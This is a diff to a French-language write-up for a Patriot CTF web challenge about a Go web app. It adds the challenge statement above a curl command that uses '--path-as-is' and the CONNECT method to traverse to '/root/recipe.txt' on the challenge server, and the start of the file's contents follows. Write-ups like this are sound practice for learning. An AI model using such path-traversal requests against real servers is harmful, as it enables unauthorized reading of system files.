@@ -1,3 +1,13 @@
+# Patriot CTF
+
+## Web
+
+**Enoncé :** Qui a besoin de Flask quand vous avez Golang -- la nouvelle méta pour les applications web.
+
+Jetez un coup d'oeil à ce site web super élégant et fonctionnel.
+
+***
+
 ```
 curl --path-as-is -X CONNECT chal2.pctf.competitivecyber.club:49515/../../../root/recipe.txt
 Ingredients: for 2 servings
